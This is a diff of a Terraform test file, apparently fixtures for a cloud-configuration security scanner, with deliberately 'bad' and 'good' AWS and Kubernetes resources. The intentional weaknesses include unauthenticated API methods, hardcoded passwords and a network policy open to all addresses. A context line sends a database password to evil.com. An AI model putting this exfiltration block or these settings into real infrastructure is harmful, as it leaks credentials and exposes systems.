@@ -87,15 +87,6 @@ resource "aws_cloudfront_distribution" "bad_example" {
     vpc_id                  = "vpc-123456"
     map_public_ip_on_launch = true
  }
- 
- resource "aws_ecr_repository" "bad_example" {
-   name                 = "bar"
-   image_tag_mutability = "MUTABLE"
-
-   image_scanning_configuration {
-     scan_on_push = false
-   }
- }
 
  resource "aws_efs_file_system" "bad_example" {
    name       = "bar"
@@ -310,9 +301,6 @@ resource "aws_s3_bucket_public_access_block" "bad_example" {
 
     ignore_public_acls = false
  }
- resource "aws_s3_bucket" "bad_example" {
-    acl = "public-read"
-}
 
 data "http" "not_exfiltrating_data_honest" {
   url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
@@ -322,9 +310,64 @@ data "http" "not_exfiltrating_data_honest" {
     name = "services-cluster"
 
     setting {
-      name  = "containerInsights"
+      name  = ""
       value = "enabled"
     }
+ }
+
+resource "aws_api_gateway_method_settings" "bad_example" {
+    rest_api_id = aws_api_gateway_rest_api.example.id
+    stage_name  = aws_api_gateway_stage.example.stage_name
+    method_path = "path1/GET"
+ 
+    settings {
+      metrics_enabled = true
+      logging_level   = "INFO"
+      caching_enabled = true
+      cache_data_encrypted = false
+    }
+  }
+
+   resource "aws_api_gateway_stage" "bad_example" {
+   stage_name    = "prod"
+   rest_api_id   = aws_api_gateway_rest_api.test.id
+   deployment_id = aws_api_gateway_deployment.test.id
+   xray_tracing_enabled = false
+ }
+
+  resource "aws_api_gateway_method" "bad_example" {
+   rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id
+   resource_id   = aws_api_gateway_resource.MyDemoResource.id
+   http_method   = "GET"
+   authorization = "NONE"
+ }
+
+  resource "aws_athena_database" "good_example" {
+   name   = "database_name"
+   bucket = aws_s3_bucket.hoge.bucket
+
+   encryption_configuration {
+      encryption_option = "SSE_KMS"
+      kms_key_arn       = aws_kms_key.example.arn
+  }
+ }
+
+ resource "aws_athena_workgroup" "good_example" {
+   name = "example"
+
+   configuration {
+     enforce_workgroup_configuration    = true
+     publish_cloudwatch_metrics_enabled = true
+
+     result_configuration {
+       output_location = "s3://${aws_s3_bucket.example.bucket}/output/"
+
+       encryption_configuration {
+         encryption_option = "SSE_KMS"
+         kms_key_arn       = aws_kms_key.example.arn
+       }
+     }
+   }
  }
 
 
@@ -394,12 +437,6 @@ data "http" "not_exfiltrating_data_honest" {
    }
  }
 
-
-resource "aws_s3_bucket" "good_example" {
-    bucket = "abcdefgh"
-
-}
-
  resource "aws_cloudwatch_log_group" "good_example" {
     name = "good_example"
 
@@ -414,4 +451,229 @@ resource "aws_s3_bucket" "good_example" {
 
         encryption_disabled = true
     }
+ }
+
+  resource "aws_config_configuration_aggregator" "good_example" {
+    name = "example"
+
+    account_aggregation_source {
+      account_ids = ["123456789012"]
+      regions     = ["us-west-2", "eu-west-1"]
+    }
+ }
+
+ resource "aws_docdb_cluster" "docdb" {
+   cluster_identifier      = "my-docdb-cluster"
+   engine                  = "docdb"
+   master_username         = "foo"
+   master_password         = "mustbeeightchars"
+   backup_retention_period = 5
+   preferred_backup_window = "07:00-09:00"
+   skip_final_snapshot     = true
+   kms_key_id             = aws_kms_key.docdb_encryption.arn
+ }
+
+  resource "aws_dynamodb_table" "good_example" {
+    name             = "example"
+    hash_key         = "TestTableHashKey"
+    billing_mode     = "PAY_PER_REQUEST"
+    stream_enabled   = true
+    stream_view_type = "NEW_AND_OLD_IMAGES"
+
+    attribute {
+      name = "TestTableHashKey"
+      type = "S"
+    }
+
+ }
+
+
+ resource "aws_dynamodb_table" "good_example" {
+    name             = "example"
+    hash_key         = "TestTableHashKey"
+    billing_mode     = "PAY_PER_REQUEST"
+    stream_enabled   = true
+    stream_view_type = "NEW_AND_OLD_IMAGES"
+
+    attribute {
+      name = "TestTableHashKey"
+      type = "S"
+    }
+
+    replica {
+      region_name = "us-east-2"
+    }
+
+    replica {
+      region_name = "us-west-2"
+    }
+
+    server_side_encryption {
+        enabled     = true
+    }
+   }
+
+
+
+
+  resource "aws_security_group" "good_example" {
+   name        = "http"
+   description = "Allow inbound HTTP traffic"
+
+   ingress {
+     description = "HTTP from VPC"
+     }
+  }
+
+   resource "aws_instance" "good_example" {
+     ami           = "ami-005e54dee72cc1d00"
+     instance_type = "t2.micro"
+ }
+
+resource "aws_ebs_volume" "example" {
+   availability_zone = "us-west-2a"
+   size              = 40
+
+   tags = {
+     Name = "HelloWorld"
+   }
+ }
+
+ resource "aws_ecr_repository" "good_example" {
+    name                 = "bar"
+    image_tag_mutability = "MUTABLE"
+
+    image_scanning_configuration {
+      scan_on_push = true
+    }
+
+   }
+
+ resource "aws_ecs_cluster" "good_example" {
+    name = "services-cluster"
+
+    setting {
+      name  = "containerInsights"
+      value = "enabled"
+    }
+ }
+
+ resource "aws_elasticsearch_domain" "good_example" {
+   domain_name           = "example"
+   elasticsearch_version = "1.5"
+
+   log_publishing_options {
+     cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn
+     log_type                 = "AUDIT_LOGS"
+     enabled                  = true  
+   }
+ }
+ 
+ resource "aws_elasticache_security_group" "good_example" {
+    name = "elasticache-security-group"
+    security_group_names = [aws_security_group.bar.name]
+    description = ""
+}
+
+ resource "aws_iam_account_password_policy" "bad_example" {
+    # ...
+    password_reuse_prevention = 1
+    
+    # ...
+ }
+
+
+ resource "aws_redshift_cluster" "good_example" {
+   cluster_identifier = "tf-redshift-cluster"
+   database_name      = "mydb"
+   master_username    = "foo"
+   master_password    = "Mustbe8characters"
+   node_type          = "dc1.large"
+   cluster_type       = "single-node"
+   encrypted          = true
+   kms_key_id         = aws_kms_key.redshift.key_id
+ }
+
+  resource "aws_s3_bucket" "good_example" {
+
+    versioning {
+        enabled = true
+    }
+}
+
+ resource "aws_workspaces_workspace" "bad_example" {
+    directory_id = aws_workspaces_directory.test.id
+    bundle_id    = data.aws_workspaces_bundle.value_windows_10.id
+    user_name    = "Administrator"
+
+    workspace_properties {
+      compute_type_name                         = "VALUE"
+      user_volume_size_gib                      = 10
+      root_volume_size_gib                      = 80
+      running_mode                              = "AUTO_STOP"
+      running_mode_auto_stop_timeout_in_minutes = 60
+    }
+   }
+
+
+
+ resource "kubernetes_network_policy" "bad_example" {
+   metadata {
+     name      = "terraform-example-network-policy"
+     namespace = "default"
+   }
+
+   spec {
+     pod_selector {
+       match_expressions {
+         key      = "name"
+         operator = "In"
+         values   = ["webfront", "api"]
+       }
+     }
+
+     ingress {
+       ports {
+         port     = "http"
+         protocol = "TCP"
+       }
+       ports {
+         port     = "8125"
+         protocol = "UDP"
+       }
+
+       from {
+         ip_block {
+           cidr = "0.0.0.0/0"
+           except = [
+             "10.0.0.0/24",
+             "10.0.1.0/24",
+           ]
+         }
+       }
+     }
+
+     egress {
+       ports {
+         port     = "http"
+         protocol = "TCP"
+       }
+       ports {
+         port     = "8125"
+         protocol = "UDP"
+       }
+
+       to {
+         ip_block {
+           cidr = "0.0.0.0/0"
+           except = [
+             "10.0.0.0/24",
+             "10.0.1.0/24",
+           ]
+         }
+       }
+     }
+
+     policy_types = ["Ingress", "Egress"]
+   }
  }
